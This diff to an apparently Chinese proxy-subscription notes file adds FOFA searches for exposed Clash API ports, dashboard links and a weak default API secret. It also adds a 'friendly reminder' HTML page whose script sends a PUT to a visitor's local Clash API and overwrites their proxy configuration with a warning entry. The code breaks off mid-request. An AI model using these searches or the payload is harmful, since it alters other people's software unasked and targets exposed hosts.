@@ -5,3 +5,44 @@ https://www.githubip.xyz/Alvin9999/pac2/master/hysteria2/2/config.json
 
 Chrome-Go 含hysteria2节点(节点最全）
 https://mareep.netlify.app/sub/merged_warp_proxies_new.yaml
+
+
+
+clash：https://fofa.info/result?qbase64=IntcImhlbGxvXCI6XCJjbGFzaFwifSI%3D
+clash.meta：https://fofa.info/result?qbase64=IntcImhlbGxvXCI6XCJjbGFzaC5tZXRhXCJ9Ig%3D%3D
+openclash：https://fofa.info/result?qbase64=cG9ydD0iOTA5MCIgJiYgYm9keT0ie1wibWVzc2FnZVwiOlwiVW5hdXRob3JpemVkXCJ9Ig%3D%3D
+
+SwitchyOmega：https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN
+
+clash Dashboard：http://clash.razord.top
+clash.meta Dashboard：http://clash.metacubex.one
+
+#API授权验证
+secret: 123456
+
+#SOCKS/HTTP代理验证
+authentication:
+- user:pass
+
+
+YAML 复制
+友情提醒html代码
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>友情提醒</title>
+</head>
+
+<body>
+    <div id="result"></div>
+    <script>
+        const data = {
+            payload: "allow-lan: false\nproxy-groups: \n  - name: 友情提醒\n    type: select\n    proxies:\n      - 你的Clash API暴露在公网，请注意防护\nproxies:\n  - name: 你的Clash API暴露在公网，请注意防护\n    type: ss\n    server: 1.1.1.1\n    port: 2222\n    cipher: aes-128-gcm\n    password: 666\n    udp: true"
+        };
+        fetch('http://127.0.0.1:9090/configs', {
+                method: 'PUT',
+                headers: {
+                    'Content-type': 'application/json; charset=utf-8',
+                    'Authorization': 'Bearer 123456' 
